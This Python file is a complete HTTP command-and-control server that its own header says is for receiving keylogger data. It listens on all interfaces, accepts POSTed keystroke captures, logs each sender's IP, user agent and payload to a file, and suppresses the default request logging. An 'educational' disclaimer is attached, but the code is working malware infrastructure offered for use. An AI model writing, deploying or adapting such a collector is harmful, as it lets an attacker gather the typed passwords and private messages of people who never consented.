#!/usr/bin/env python3
"""
HTTP C2 Server for Keylogger Data Reception
Receives HTTP POST requests and logs all data.
For Educational/Research Purposes Only!
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import datetime
import sys

PORT = 25565  # Default port, can be changed
LOG_FILE = "keylogger_http_data.txt"


class C2RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        """Handle POST requests from keylogger."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')

        # Meta data
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]

        print(f"\n[+] [{timestamp}] Received POST from {client_ip}")
        print(f"    Path: {self.path}")
        print(f"    Size: {len(post_data)} bytes")
        print(f"    Data (first 128 bytes): {post_data[:128]!r}")

        # Append to log file
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"\n{'=' * 70}\n")
            f.write(f"[{timestamp}] {client_ip}\n")
            f.write(f"Path: {self.path}\n")
            f.write(f"User-Agent: {self.headers.get('User-Agent', 'Unknown')}\n")
            f.write(f"Content-Type: {self.headers.get('Content-Type', 'Unknown')}\n\n")
            f.write(post_data + "\n")

        # Respond to client
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'OK')

    def do_GET(self):
        """Allow for healthcheck GET requests."""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[*] [{timestamp}] GET {self.path} from {self.client_address[0]}")
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'C2 Server Active')

    def log_message(self, format, *args):
        # Silence default HTTP logging
        return


def main():
    server_port = PORT
    if len(sys.argv) > 1:
        # Custom port as first argument
        try:
            server_port = int(sys.argv[1])
        except ValueError:
            print("Usage: python3 http_c2_server.py [PORT]")
            sys.exit(1)

    httpd = HTTPServer(("0.0.0.0", server_port), C2RequestHandler)
    print("=" * 70)
    print(f"HTTP C2 Server - Keylogger Data Receiver")
    print("=" * 70)
    print(f"[*] Listening on 0.0.0.0:{server_port}")
    print(f"[*] Log file: {LOG_FILE}")
    print(f"[*] Receiving HTTP POST requests at e.g.:")
    print(f"    http://0.0.0.0:{server_port}/logs")
    print(f"    http://localhost:{server_port}/logs")
    print(f"[*] Press Ctrl+C to stop")
    print("=" * 70)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down.")
        httpd.shutdown()


if __name__ == "__main__":
    main()
